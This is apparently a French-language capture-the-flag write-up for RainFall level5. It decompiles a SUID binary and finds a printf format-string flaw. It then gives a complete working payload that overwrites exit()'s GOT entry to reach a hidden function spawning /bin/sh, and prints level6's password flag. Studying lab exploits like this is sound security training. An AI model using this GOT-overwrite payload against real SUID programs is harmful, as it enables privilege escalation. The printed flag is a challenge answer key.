# RainFall CTF - Level5

## Reconnaissance

### Fichier trouvé
```bash
level5@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level6 users 5403 Mar  6  2016 level5
```

**Observations :**
- Exécutable avec SUID bit activé (`s` dans les permissions)
- Appartient à `level6` (propriétaire) et `users` (groupe)
- Peut être exécuté avec les privilèges de `level6`

## Analyse statique avec Ghidra

### Fonction main
```c
void main(void) {
  n();
  return;
}
```

### Fonction n (vulnérable)
```c
void n(void) {
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  printf(local_20c);          // ← VULNÉRABILITÉ FORMAT STRING
  exit(1);
}
```

### Fonction cachée non utilisée
```c
void o(void) {
  system("/bin/sh");
  _exit(1);
}
```

**Code assembleur :**
```asm
o:
080484a4 55    PUSH EBP
```

L'adresse de la fonction `o()` est **`0x080484a4`**.

## Analyse des vulnérabilités

### Format String Vulnerability
- **Fonction dangereuse** : `printf(local_20c)` dans `n()`
- **Problème** : Input utilisateur passé directement comme format string
- **Impact** : Contrôle total des spécificateurs de format

### Stratégie d'exploitation
Au lieu de modifier une variable comme dans les niveaux précédents, cette fois il faut **rediriger l'exécution** vers la fonction cachée `o()`.

**Méthode** : Écraser l'entrée GOT (Global Offset Table) de `exit()` pour qu'elle pointe vers `o()`.

## Reconnaissance des adresses

### Adresse GOT de exit()
```bash
objdump -R ./level5
```

**Résultat :**
```
DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE 
...
08049838 R_386_JUMP_SLOT   exit
...
```

L'adresse GOT de `exit()` est **`0x08049838`**.

### Localisation sur la pile
```bash
python -c "print('\x38\x98\x04\x08' + '0x%x ' * 20)" | ./level5
```

L'adresse GOT `0x08049838` apparaît à la **position 4** sur la pile.

## Construction de l'exploit

### Valeur à écrire
- **Adresse cible** : `0x080484a4` (fonction `o`)
- **Conversion décimale** : `134513828`

### Calcul du payload
```
Adresse GOT : 4 caractères
Padding printf : 134513824 caractères  
Total : 134513828 caractères = 0x080484a4
```

### Payload final
```bash
(python -c "print('\x38\x98\x04\x08' + '%134513824x%4\$n')"; cat) | ./level5
```

**Structure :**
- `\x38\x98\x04\x08` : Adresse GOT de `exit()` (4 octets)
- `%134513824x` : Spécificateur de largeur (génère 134513824 caractères)
- `%4$n` : Écrit le nombre total de caractères (134513828) à la position 4

## Mécanisme d'exécution

1. `fgets()` lit le payload dans `local_20c`
2. `printf(local_20c)` exécute la format string :
   - Affiche l'adresse GOT (`0x08049838`)
   - `%134513824x` génère 134 millions d'espaces
   - `%4$n` écrit `134513828` dans la GOT de `exit()`
3. La GOT de `exit()` contient maintenant l'adresse de `o()` (0x080484a4)
4. `exit(1)` appelle la fonction à l'adresse stockée dans la GOT → redirige vers `o()`
5. `o()` exécute `system("/bin/sh")` avec les privilèges de level6

## Exploitation réussie

```bash
level5@RainFall:~$ (python -c "print('\x38\x98\x04\x08' + '%134513824x%4\$n')"; cat) | ./level5
[134 millions d'espaces...]
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

### Accès niveau suivant
- **Utilisateur** : `level6`
- **Prochain challenge** : `/home/user/level6/`

## Notes techniques

- **Type de vulnérabilité** : Format String Vulnerability avec GOT Overwrite
- **Technique d'exploitation** : Redirection de fonction via Global Offset Table
- **Architecture** : x86 (32-bit)
- **Concepts avancés** :
  - **GOT Overwrite** : Modification des pointeurs de fonctions systèmes
  - **Redirection d'exécution** : Détournement d'appels de fonctions
  - **Spécificateurs de largeur** : Génération automatique de caractères par `printf`
- **Valeur écrite** : 134513828 (0x080484a4)
- **Optimisation** : Écriture multi-parties pour les grandes valeurs
- **Difficulité** : Avancé - Introduction aux techniques GOT overwrite

## Évolution par rapport aux niveaux précédents

Ce niveau introduit :
- **GOT Overwrite** au lieu de modification de variables
- **Redirection de flux d'exécution** via pointeurs de fonctions
- **Gestion de très grandes valeurs** en format string
- **Optimisations de performance** pour les exploits pratiques

Cette progression montre l'évolution vers des techniques d'exploitation plus sophistiquées utilisées dans des scénarios réels.
